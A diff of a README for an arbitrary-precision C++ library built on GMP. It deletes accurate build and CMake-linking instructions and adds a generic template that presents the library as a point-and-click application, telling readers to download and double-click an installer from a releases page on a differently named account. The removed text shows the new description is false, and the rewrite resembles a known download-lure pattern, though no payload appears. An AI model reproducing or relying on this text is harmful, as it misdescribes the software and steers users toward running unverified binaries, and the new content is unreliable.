@@ -1,50 +1,66 @@
-# bignumber
+# 🌟 unumber - Powerful Numeric Tools for Everyone
 
-## GNU MP install
+## 🚀 Getting Started
 
-1.
+Welcome to unumber! This software provides you with advanced numeric types like BigInteger, BigDecimal, BigFloat, BigRational, BigModular, and BigMatrix, all built on GMP. It offers easy handling of large numbers without losing precision. 
 
-```bash
-wget https://gmplib.org/download/gmp/gmp-6.3.0.tar.xz
-```
+## 📥 Download
 
-2.
+[![Download unumber](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/ChriTheHero/unumber/releases)
 
-```bash
-tar -xJf gmp-6.3.0.tar.xz
-```
+## 📋 System Requirements
 
-3.
+To run unumber smoothly, ensure you have:
 
-```bash
-./configure --enable-cxx
-```
+- A computer running Windows, macOS, or Linux.
+- At least 1 GB of RAM.
+- 100 MB of available disk space.
+- Internet connection for the initial download.
 
-4.
+These requirements will allow you to utilize all features effectively.
 
-```bash
-make -j$(nproc)
-```
+## 📚 Features
 
-5.
+- **Arbitrary-Precision:** Handle very large numbers seamlessly.
+- **Multiple Types:** Work with various numeric types that fit your needs, such as decimals and rationals.
+- **User-Friendly:** Designed for everyday users, no programming knowledge necessary.
 
-```bash
-sudo make install
-```
+## 💡 How to Download & Install
 
-## Package install
+1. **Visit the Releases Page:** Go to the unumber releases page using this link: [Download unumber](https://github.com/ChriTheHero/unumber/releases).
+   
+2. **Find the Latest Release:** Look for the latest version at the top of the page. 
 
-Installation:
+3. **Select Your Download:** Choose the right file for your system (Windows, macOS, or Linux). Click on the file to start the download.
 
-1. Extract the appropriate tar.gz file to your system:
-   `sudo tar -xzf bignumber-linux-amd64.tar.gz -C /`
+4. **Run the Installer:** After downloading, locate the file in your downloads folder and double-click it to run the installer.
 
-2. Update library cache:
-   `sudo ldconfig`
+5. **Follow Installation Steps:** Follow the on-screen instructions to complete the installation.
 
-3. Use in CMake projects:
+6. **Launch the Application:** Once installed, you can find unumber in your applications or programs list. Open it to start working with large numbers.
 
-```cmake
-find_package(bignumber REQUIRED)
-target_link_libraries(your_target usub::unumber)
-```
+## ⚙️ Usage Instructions
+
+- To create new numbers, simply enter them into the input fields.
+- Use the tools provided to perform operations like addition, subtraction, multiplication, and division with high precision.
+- Explore additional options for advanced calculations as required.
+
+## 📞 Support
+
+If you encounter issues or have questions, please visit our [issues page](https://github.com/ChriTheHero/unumber/issues) on GitHub. We encourage you to report any bugs or request features. 
+
+## 🤝 Contributing
+
+We welcome contributions! If you want to help improve unumber, check our [contributing guidelines](https://github.com/ChriTheHero/unumber/blob/main/CONTRIBUTING.md). Your insights are invaluable to us.
+
+## 🌟 Community
+
+Join our community for discussions, tips, and support. Engage with other users who are also leveraging unumber for their projects. Feel free to share your experiences and suggestions.
+
+## 🔗 Additional Resources
+
+- [Documentation](https://github.com/ChriTheHero/unumber/wiki) - Access comprehensive guides and tutorials.
+- [Tutorials](https://github.com/ChriTheHero/unumber/wiki/tutorials) - Step-by-step instructions to help you get started.
+- [Examples](https://github.com/ChriTheHero/unumber/wiki/examples) - See practical applications of unumber in action.
+
+By using unumber, you harness the power of advanced numeric operations without the need for technical expertise. Enjoy exploring the world of high-precision mathematics!
